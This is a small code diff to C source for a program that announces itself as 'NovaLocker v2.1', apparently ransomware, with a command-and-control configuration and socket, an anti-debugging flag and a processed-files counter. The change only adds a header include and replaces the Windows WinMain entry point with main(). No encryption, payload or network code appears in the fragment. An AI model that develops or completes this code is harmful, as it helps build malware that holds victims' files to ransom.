@@ -3,6 +3,7 @@
 #include "../include/crypto.h"
 #include "../include/network.h"
 #include "../include/file_ops.h"
+#include "../include/utils.h"
 
 // Global variables
 C2_CONFIG g_c2_config = {0};
@@ -10,7 +11,7 @@ SOCKET g_c2_socket = INVALID_SOCKET;
 BOOL g_debug_detected = FALSE;
 DWORD g_files_processed = 0;
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int main() {
     printf("NovaLocker v2.1 - Starting...\n");
 
     // 1. Vérifications anti-debug
